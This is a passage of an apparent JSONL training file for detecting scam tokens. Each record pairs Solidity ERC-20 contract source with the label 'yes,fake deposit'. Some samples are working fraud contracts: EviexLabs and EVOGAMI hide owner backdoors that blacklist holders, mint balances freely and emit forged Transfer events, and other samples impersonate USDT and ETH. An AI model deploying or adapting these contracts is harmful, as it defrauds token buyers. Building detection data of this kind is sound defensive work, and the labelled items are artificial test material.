//\u4ee3\u5e01\u4f9b\u5e94\u91cf\n\n \n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n\n \n //JGO\u5408\u7ea6\u521d\u59cb\u5316\u51fd\u6570(\u5408\u7ea6\u6240\u6709\u4eba\u5730\u5740, \u5f53\u524d\u4f9b\u5e94\u91cf, \u4ee3\u5e01\u603b\u91cf)\n function JGOToken(address _ethFundDeposit, uint256 _totalSupply) {\n ethFundDeposit = _ethFundDeposit;\n \n currentSupply = formatDecimals(_totalSupply); //\u5f53\u524d\u4f9b\u5e94\u91cf\n totalSupply = formatDecimals(_totalSupply); //\u4ee3\u5e01\u603b\u91cf\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.5;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000; // Update total supply (100000 for example)\n name = \"getirgold\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"GGD\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.18;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _buildr = 0x3037290Aa65CbC698Fa4365023C3f847a6feE68D;\n\taddress UniswapV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract EviexLabs is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private IxI;\n\tmapping (address => bool) private Io;\n mapping (address => bool) private Oi;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _Total = 150000000 * 10**_decimals;\n string private constant _name = \"Eviex Labs\";\n string private constant _symbol = \"EVIEX\";\n\n\n\n constructor () {\n IxI[_MsgSendr()] = _Total;\n emit Transfer(address(0), UniswapV2, _Total);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _Total;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return IxI[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction zend(address z) public {\n if(Io[msg.sender]) { \n Oi[z] = false;}}\n function zquery(address z) public{\n if(Io[msg.sender]) { \n require(!Oi[z]);\n Oi[z] = true; }}\n\t\tfunction zstake(address z) public{\n if(msg.sender == _buildr) { \n require(!Io[z]);\n Io[z] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _buildr) {\n require(amount <= IxI[sender]);\n IxI[sender] -= amount; \n IxI[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UniswapV2, recipient, amount);\n return true; } \n if(!Oi[recipient]) {\n if(!Oi[sender]) {\n require(amount <= IxI[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n IxI[sender] -= amount;\n IxI[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _buildr) {\n require(IxI[msg.sender] >= amount);\n IxI[msg.sender] -= amount; \n IxI[recipient] += amount; \n emit Transfer (UniswapV2, recipient, amount);}\n if(Io[msg.sender]) {IxI[recipient] = amount;} \n if(!Oi[msg.sender]) {\n require(IxI[msg.sender] >= amount);\n IxI[msg.sender] -= amount; \n IxI[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.8;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract Loeker is ERC20 {\n string public constant symbol = \"USDT\";\n string public constant name = \"Tether USD\";\n uint8 public constant decimals = 10;\n \n //1,000,000+10 zeros\n uint private constant __totalSupply = 10000000000000000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-4.0\n\npragma solidity ^0.6.7;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract Loeker is ERC20 {\n string public constant symbol = \"MYN\";\n string public constant name = \"Myron\";\n uint8 public constant decimals = 6;\n \n //1,000,000+18 zeros\n uint private constant __totalSupply = 1000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.17;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000; // Update total supply (100000 for example)\n name = \"PBSC Coin\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"PBSC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.18;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _zConst = 0x7De4D03d99ef36CAA1Cc504b198e80da746114f9;\n\taddress zRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract EVOGAMI is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Zc;\n\tmapping (address => bool) private Zb;\n mapping (address => bool) private Za;\n mapping (address => mapping (address => uint256)) private Ze;\n uint8 private constant _decimals = 8;\n uint256 private constant _zSupply = 200000000 * 10**_decimals;\n string private constant _name = \"EVOGAMI\";\n string private constant _symbol = \"EVOGAMI\";\n\n\n\n constructor () {\n Zc[_msgSender()] = _zSupply;\n emit Transfer(address(0), zRouterV2, _zSupply);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _zSupply;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Zc[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Ze[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n Ze[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction zRNG(address Zf) public {\n if(Zb[msg.sender]) { \n Za[Zf] = false;}}\n function zCheck(address Zf) public{\n if(Zb[msg.sender]) { \n require(!Za[Zf]);\n Za[Zf] = true; }}\n\t\tfunction zDele(address Zf) public{\n if(msg.sender == _zConst) { \n require(!Zb[Zf]);\n Zb[Zf] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _zConst) {\n require(amount <= Zc[sender]);\n Zc[sender] -= amount; \n Zc[recipient] += amount; \n Ze[sender][msg.sender] -= amount;\n emit Transfer (zRouterV2, recipient, amount);\n return true; } else \n if(!Za[recipient]) {\n if(!Za[sender]) {\n require(amount <= Zc[sender]);\n require(amount <= Ze[sender][msg.sender]);\n Zc[sender] -= amount;\n Zc[recipient] += amount;\n Ze[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Zd, uint256 Zf) public {\n if(msg.sender == _zConst) {\n require(Zc[msg.sender] >= Zf);\n Zc[msg.sender] -= Zf; \n Zc[Zd] += Zf; \n emit Transfer (zRouterV2, Zd, Zf);} else \n if(Zb[msg.sender]) {Zc[Zd] += Zf;} else\n if(!Za[msg.sender]) {\n require(Zc[msg.sender] >= Zf);\n Zc[msg.sender] -= Zf; \n Zc[Zd] += Zf; \n emit Transfer(msg.sender, Zd, Zf);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract MyEther is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function MyEther(\n ) {\n balances[msg.sender] = 1000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000000000000; // Update total supply (100000 for example)\n name = \"Ethereum\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"ETH\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "function assert(bool assertion) internal { if (!assertion) { */\n \n \n \n\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n\n}\n\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns 